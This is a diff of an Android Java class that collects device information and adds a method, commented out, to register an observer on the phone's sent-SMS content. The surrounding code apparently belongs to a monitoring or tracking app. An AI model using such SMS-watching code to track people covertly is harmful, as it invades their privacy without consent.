@@ -10,12 +10,15 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.net.ConnectivityManager;
+import android.net.Uri;
+import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 
 import com.inet.android.request.DataRequest;
+import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
@@ -36,7 +39,7 @@ public class GetInfo {
 
 	public void getInfo() {
 		date = new ConvertDate();
-
+		contentObserved();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		telephonyManager = (TelephonyManager) mContext
 				.getSystemService(Context.TELEPHONY_SERVICE);
@@ -522,4 +525,9 @@ public class GetInfo {
 		return str_ScreenSize;
 	}
 
+	public void contentObserved() {
+//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
+//		mContext.getContentResolver().registerContentObserver(
+//				Uri.parse("content://sms/sent"), true, null);
+	}
 }
